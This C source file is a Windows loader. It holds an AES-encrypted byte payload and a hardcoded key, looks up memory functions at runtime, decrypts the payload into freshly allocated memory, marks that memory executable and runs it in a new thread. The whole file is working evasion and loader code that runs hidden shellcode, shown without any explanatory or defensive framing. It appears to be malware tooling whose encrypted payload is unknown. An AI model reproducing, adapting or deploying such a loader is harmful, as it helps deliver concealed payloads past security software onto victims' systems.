#include<windows.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<wincrypt.h>
#include<Psapi.h>

typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

typedef VOID(WINAPI* RtlMoveMemory_t)(VOID UNALIGNED* Destination, const VOID UNALIGNED* Source, SIZE_T Length);

int AESDecrypt(char* buf, unsigned int buflen, CHAR* key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY  hKey;

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
		return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
		return -1;
	}
	if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
		return -1;
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
		return -1;
	}
	if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*) buf, (DWORD*) &buflen)) {
		return -1;
	}
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);

	return 0; 
}

unsigned char key[] = { 0x3e, 0xdd, 0xe, 0x24, 0xe3, 0x42, 0x81, 0x24, 0x5c, 0x44, 0x2d, 0x1e, 0x70, 0x7f, 0x8a, 0xf6 };
unsigned char buf[] = { 0x1b, 0x3f, 0x22, 0xa1, 0x65, 0xf7, 0x5e, 0x7c, 0xaa, 0x70, 0x5f, 0xd2, 0xd6, 0xf2, 0xbc, 0xb7, 0xc2, 0x90, 0xa6, 0x44, 0x37, 0x0, 0xf, 0xec, 0x9d, 0xcd, 0xfe, 0xeb, 0x44, 0x24, 0x51, 0xed, 0x30, 0xae, 0xb1, 0x69, 0xaf, 0x9a, 0x25, 0x6b, 0x86, 0xc1, 0x47, 0xd1, 0xa, 0xba, 0x4e, 0x88, 0x84, 0x7e, 0xf6, 0xaf, 0x3, 0x81, 0x6f, 0x9b, 0x6f, 0x9e, 0xa9, 0xbe, 0xd7, 0x8d, 0xa9, 0x1d, 0xfd, 0xa8, 0x9e, 0xb0, 0xac, 0xa2, 0xdb, 0xa, 0xe3, 0xed, 0x41, 0xe3, 0xc6, 0x3a, 0xb5, 0x0, 0xbe, 0x4, 0x5f, 0xed, 0x61, 0x21, 0xbd, 0xb2, 0xfb, 0x75, 0x2e, 0x14, 0xb9, 0xac, 0xe8, 0x17, 0x86, 0xe2, 0x63, 0xc9, 0x57, 0xc3, 0xb5, 0x2c, 0xb1, 0xc1, 0xdc, 0xd2, 0xf0, 0xce, 0x0, 0x20, 0xef, 0x6a, 0x9d, 0x64, 0x9b, 0xf0, 0x33, 0x58, 0xe4, 0x68, 0x77, 0x73, 0x14, 0x99, 0xa6, 0x5d, 0xff, 0x3, 0xd0, 0xf1, 0x7c, 0xa, 0x1a, 0x75, 0x3a, 0x51, 0x43, 0xe4, 0x96, 0x4e, 0x64, 0x4, 0x2a, 0xf2, 0x88, 0xc2, 0x21, 0x9b, 0x2e, 0x7b, 0x84, 0x30, 0x37, 0x2c, 0x12, 0x8b, 0xcc, 0x11, 0x7b, 0x64, 0xdd, 0xaa, 0x47, 0xf7, 0x70, 0xc, 0xbd, 0x47, 0xf1, 0x6e, 0x1b, 0xc7, 0xcd, 0x6b, 0xbd, 0x98, 0x21, 0x43, 0xde, 0xd0, 0xc7, 0x5f, 0xeb, 0x4d, 0x12, 0x5a, 0x9, 0xf1, 0xce, 0x7f, 0x80, 0x3f, 0x57, 0xcd, 0x36, 0x14, 0xd4, 0x20, 0x5b, 0xe1, 0x4f, 0x9b, 0x8b, 0xd6, 0xaf, 0xb9, 0x64, 0x4e, 0xbc, 0x2d, 0xa2, 0x56, 0xf0, 0x9, 0xf0, 0xbc, 0x54, 0x82, 0xb3, 0x6c, 0x4b, 0x88, 0xde, 0xad, 0x7d, 0xbc, 0xb6, 0x9e, 0xe6, 0x8, 0xa, 0x45, 0xab, 0xdc, 0x61, 0xca, 0x1f, 0xbb, 0x47, 0xa8, 0x95, 0xa8, 0x56, 0x37, 0x2, 0xb2, 0xbb, 0x20, 0x90, 0x4, 0xf4, 0x5f, 0xf9, 0xfa, 0xda, 0x2, 0xbe, 0xa6, 0xd7, 0x20, 0xd3, 0xad, 0x95, 0x1f, 0x89, 0x6, 0x87, 0x78, 0xe5, 0x5d, 0x79, 0xe8, 0xbd, 0x56, 0x54, 0x33, 0xf, 0x86, 0x8, 0xe5, 0xc, 0x6c, 0x89, 0xe, 0xf8, 0x8c, 0x33, 0xee, 0xd9, 0x94, 0xd1, 0x9e, 0x65, 0xfa, 0x12, 0x89, 0x13, 0x34, 0xb2, 0xb5, 0x69, 0x84, 0xdf, 0x6a, 0x50, 0xcf, 0x97, 0x37, 0xbe, 0x59, 0xf4, 0x84, 0xf7, 0xee, 0xdc, 0x4b, 0xcd, 0x29, 0x6, 0xcf, 0xe1, 0x9f, 0xda, 0xe6, 0x49, 0x30, 0xaa, 0xa7, 0xa0, 0x10, 0x25, 0xa5, 0xb6, 0xc0, 0x11, 0x1e, 0xc9, 0x47, 0x1a, 0x9f, 0x6f, 0x3a, 0xdc, 0x33, 0xc1, 0xf0, 0x9a, 0xba, 0x53, 0xe7, 0x8f, 0xd4, 0x45, 0x7f, 0x2f, 0x8b, 0xce, 0xc5, 0xed, 0x3, 0xca, 0xdf, 0xec, 0xd7, 0x33, 0x7a, 0xb3, 0xf, 0xcf, 0xf9, 0x1d, 0x59, 0xbd, 0xda, 0xf1, 0xe4, 0x43, 0xd7, 0xf9, 0x36, 0x91, 0x8d, 0x81, 0xc8, 0x14, 0x8e, 0xf2, 0xaf, 0xef, 0xc7, 0x56, 0x6f, 0xef, 0xb3, 0x2a, 0x6b, 0xe8, 0x29, 0x8f, 0x1a, 0x4b, 0xf5, 0x5c, 0xf, 0xa1, 0x19, 0xa0, 0x4, 0x5f, 0xe, 0x70, 0x3e, 0xdc, 0x13, 0x24, 0xa6, 0xef, 0xa, 0x6e, 0x22, 0x1c, 0x19, 0x43, 0x31, 0xc2, 0x54, 0xda, 0xb9, 0x9d, 0x41, 0x48, 0xc3, 0x36, 0x1f, 0xd5, 0xfa, 0x45, 0x89, 0xc7, 0x9b, 0x9f, 0x9b, 0xa7, 0x5, 0x43, 0x26, 0x57, 0xe8, 0x30, 0xe2, 0xf9, 0xf1, 0x7a, 0xe, 0x47, 0xcf, 0xb, 0xfc, 0xa, 0x32, 0x7a, 0x7, 0x1b, 0xcd, 0x0, 0x6f, 0x2b, 0xeb, 0xdb, 0x50, 0x8a, 0xb7, 0xba, 0x5c, 0xaf, 0x48, 0xd0, 0xf2, 0xd4, 0xf5, 0x97, 0xba, 0xb7, 0xbd, 0x72, 0x5d, 0xcb, 0xe2, 0x1b, 0xe8, 0x35, 0x6e, 0x39, 0x25, 0xb8, 0x9c, 0x47, 0x0, 0xd6, 0xe4, 0xef, 0xb3, 0x9c, 0x80, 0x8e, 0x76, 0x73, 0xf2, 0x4f, 0xe7, 0x13, 0x40, 0x89, 0x2a, 0xb3, 0x17, 0x69, 0x8c, 0x16, 0x65, 0xa3, 0x84, 0xbc, 0xe0, 0x6d, 0xb1, 0x6f, 0x95, 0x40, 0xa5, 0xa4, 0x3e, 0x8, 0x51, 0x7a, 0x1e, 0x7, 0x20, 0xa4, 0x14, 0xca, 0xae, 0xe, 0xbb, 0xe3, 0x10, 0x19, 0xd3, 0x8b, 0x2c, 0xe7, 0x32, 0x1, 0xd5, 0xbb, 0x29, 0x2c, 0xcf, 0xc8, 0xd5, 0x23, 0x7, 0xa5, 0x84, 0x96, 0x86, 0xd7, 0x6c, 0xdb, 0x4c, 0x93, 0x70, 0x6e, 0x8e, 0x41, 0xae, 0x44, 0x2a, 0xda, 0xf, 0x1a, 0xdd, 0xa1, 0x35, 0x13, 0x50, 0x4d, 0x30, 0xc8, 0x3, 0x56, 0x4b, 0x10, 0x7e, 0xab, 0x2b, 0xf, 0x30, 0x5e, 0xcf, 0xaa, 0xef, 0x6f, 0x7b, 0xaf, 0x53, 0x8b, 0x57, 0x6e, 0xe1, 0xec, 0x6d, 0x65, 0x55, 0x62, 0x33, 0x33, 0x70, 0xb5, 0x45, 0x95, 0xe4, 0x9d, 0xb9, 0xbb, 0xbd, 0x16, 0x3a, 0x17, 0x24, 0x46, 0xff, 0x23, 0x1d, 0xea, 0x5e, 0x39, 0x9d, 0x8d, 0x3a, 0x20, 0xfa, 0x45, 0xd, 0x86, 0x45, 0x79, 0x24, 0x82, 0x7a, 0x30, 0x6, 0x3c, 0x21, 0xe1, 0xe5, 0x6a, 0xb0, 0xeb, 0xdd, 0x57, 0xa8, 0x16, 0x90, 0x3f, 0x12, 0x6a, 0xe3, 0xb4, 0x1e, 0xf7, 0x4b, 0x14, 0xf3, 0x34, 0xdb, 0x83, 0x99, 0xbc, 0x27, 0x2e, 0x49, 0x50, 0xae, 0xb5, 0x84, 0x6a, 0x8e, 0xba, 0x3e, 0x53, 0xe1, 0x2c, 0x28, 0x18, 0xaa, 0x6d, 0x8f, 0x7f, 0xc8, 0xba, 0xc4, 0xa4, 0xe4, 0x1c, 0x1a, 0x6e, 0x5c, 0xd7, 0x31, 0xce, 0x2a, 0x70, 0x1c, 0x9f, 0xa4, 0x89, 0x2a, 0x64, 0x4e, 0x8f, 0xed, 0x1b, 0x42, 0x70, 0x6a, 0x17, 0xb2, 0xb0, 0xdb, 0x76, 0x8e, 0xa4, 0x33, 0xfa, 0x25, 0x73, 0xae, 0xe6, 0xfe, 0xb1, 0x8b, 0xba, 0x56, 0x42, 0x9b, 0x7c, 0x9e, 0x99, 0xb, 0x8f, 0x1f, 0x15, 0xe2, 0xd2, 0xad, 0x62, 0x9f, 0xa2, 0x30, 0x76, 0xbe, 0x1e, 0x21, 0x5c, 0xf5, 0x46, 0x2b, 0x1f, 0x1a, 0xb7, 0xc1, 0xdb, 0x69, 0x1c, 0x44, 0xdc, 0xa7, 0x7e, 0x38, 0x17, 0x14, 0x1b, 0x3c, 0x5b, 0xbd, 0x95, 0xc0, 0x2f, 0x7, 0xcb, 0xd1, 0x6c, 0xaf, 0xb3, 0x13, 0xc8, 0x25, 0x8e, 0xa0, 0xe, 0x36, 0x35, 0xfe, 0xc, 0xe6, 0xd, 0x13, 0x9d, 0xd5, 0x79, 0xa5, 0x56, 0x36, 0x9b, 0xee, 0xa7, 0x88, 0xba, 0x45, 0xd6, 0x40, 0x2b, 0xa3, 0x81, 0xc8, 0xf6, 0xf9, 0x3a, 0x26, 0xe1, 0xdd, 0x58, 0xab, 0x93, 0x4b, 0x55, 0x4d, 0x35, 0x76, 0xe0, 0x30, 0x33, 0xc1, 0xe7, 0x22, 0x40, 0x1a, 0x4, 0x73, 0xcb, 0x81, 0xc1, 0xbb, 0x17, 0x30, 0xb1, 0xf6, 0x7d, 0x33, 0x6b, 0x6e, 0x22, 0xcb, 0x71, 0x97, 0x17, 0x6c, 0x9e, 0x54, 0xb9, 0xa3, 0x1d, 0x24, 0xbf, 0xff, 0xeb, 0x31, 0xaa, 0x9b, 0xec, 0x88, 0x8f, 0xc4, 0x93, 0x22, 0x5c, 0x71, 0x1c, 0x4c, 0x7c, 0xc, 0x8a, 0xec, 0xda, 0xc3, 0xb, 0xdd, 0x3d, 0x6, 0xc3, 0x5e, 0x38, 0x95, 0xaf, 0x88, 0xcc, 0xed, 0x50, 0x77, 0xe6, 0xfa, 0x88, 0x12, 0x8b, 0x29, 0x74, 0xd7, 0xfe, 0x28, 0x82, 0x30, 0xcc, 0xa9, 0x33, 0x21, 0xf3, 0xda, 0x53, 0x9c, 0xcb, 0x92, 0xba, 0xa2, 0x2c, 0x33, 0x7e, 0x88, 0x4c, 0x3b, 0x2d, 0x4a, 0xa1, 0xfe, 0xe4, 0x2e, 0xf5, 0x7e, 0x17, 0x0, 0xf6, 0xe8, 0x32, 0x9b, 0x2, 0x31, 0xa6, 0x87, 0x30, 0x78, 0x5d, 0x52, 0x1d, 0xc5, 0x19, 0x34, 0x5a, 0x73, 0x1f, 0xe4, 0x6, 0x2e, 0x8b, 0x9b, 0xd1, 0xb3, 0x6f, 0x50, 0x25, 0xd, 0xdf, 0x44, 0xb8, 0x3d, 0xbc, 0x28, 0xf9, 0xdb, 0xc8, 0xf1, 0x23, 0xae, 0x39, 0x90, 0x26, 0x78, 0xa5, 0xb6, 0x42, 0x2c, 0xd6, 0x96, 0x73, 0x62, 0xe, 0x50, 0xe8, 0x86, 0x83, 0xc4, 0x86, 0x3, 0x27, 0x91, 0x6c, 0x90, 0x9f, 0x14, 0xa, 0x94, 0x9, 0x6f, 0xb, 0x35, 0xad, 0x74, 0xe9, 0xf, 0x8, 0x93, 0x49, 0x97, 0x1c, 0x30, 0x92, 0xe7, 0x17, 0xb8, 0x9b, 0xee, 0x97, 0xa0, 0xcf, 0x78, 0x54, 0x1d, 0xfa, 0xe5, 0x13, 0xc2, 0x74, 0x53, 0x5f, 0x5c, 0xb5, 0xe3, 0x17, 0xc1, 0xc0, 0xe7, 0xd2, 0x82, 0xea, 0x93, 0x12, 0x9e, 0xd, 0xc4, 0x92, 0xf, 0x22, 0x80, 0xde, 0x9, 0x2a, 0xc4, 0x4, 0xa8, 0x41, 0x16, 0xd0, 0x44, 0x2d, 0x5c, 0x4d, 0xe2, 0xb2, 0x73, 0x55, 0x58, 0x93, 0x5b, 0x97, 0x68, 0x38, 0x97, 0x79, 0xd8, 0x35, 0xda, 0x4, 0xdd };
unsigned int buflen = sizeof(buf);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	VirtualAlloc_t pVirtualAlloc = (VirtualAlloc_t)GetProcAddress(GetModuleHandle("KERNEL32.dll"), "VirtualAlloc");
	RtlMoveMemory_t pRtlMoveMemory = (RtlMoveMemory_t)GetProcAddress(GetModuleHandle("KERNEL32.dll"), "RtlMoveMemory");

	exec_mem = pVirtualAlloc(0, buflen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	AESDecrypt((char*) buf, buflen, (CHAR*) key, sizeof(key));

	pRtlMoveMemory(exec_mem, buf, buflen);

	rv = VirtualProtect(exec_mem, buflen, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
	return 0;
}

